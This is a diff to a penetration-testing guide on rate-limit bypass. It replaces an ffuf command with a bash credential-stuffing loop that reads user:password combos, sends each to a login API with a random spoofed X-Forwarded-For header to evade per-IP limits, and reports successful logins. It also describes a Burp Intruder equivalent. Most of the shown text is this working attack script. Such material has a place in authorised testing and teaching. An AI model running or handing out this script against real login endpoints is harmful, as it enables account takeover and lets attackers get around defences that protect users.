@@ -69,17 +69,21 @@ Where a limit exists but is incremented after the check, fire many requests in p
 
 ## Exploitation
 
-A credential-stuffing run against a confirmed account list, rotating the source header, with Turbo Intruder or a script:
+A credential-stuffing run against a confirmed account list, parsing `user:password` combos and rotating the source header per request:
 
 ```bash
-ffuf -w creds.txt:CRED -u https://target/api/login -X POST \
-  -H 'Content-Type: application/json' \
-  -H 'X-Forwarded-For: FUZZRND' \
-  -d '{"user":"CREDUSER","pass":"CREDPASS"}' \
-  -mc 200
+# creds.txt holds user:password combos, restricted to confirmed accounts
+while IFS=: read -r user pass; do
+  xff="$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255))"
+  code=$(curl -s -o /dev/null -w '%{http_code}' -X POST https://target/api/login \
+    -H 'Content-Type: application/json' \
+    -H "X-Forwarded-For: $xff" \
+    -d "{\"user\":\"$user\",\"pass\":\"$pass\"}")
+  [ "$code" = "200" ] && echo "HIT  $user:$pass"
+done < creds.txt
 ```
 
-Combine with the enumeration output so you only try live accounts, which keeps volume (and lockout risk) down and success rate up.
+Each iteration parses one combo and sends a fresh random `X-Forwarded-For`, so a per-IP limiter that trusts the header never sees a repeated source. Burp Intruder does the same with the combo file split across two keywords in pitchfork mode and a generated payload for the header. Combine with the enumeration output so you only try live accounts, which keeps volume (and lockout risk) down and success rate up.
 
 ## Tools
 
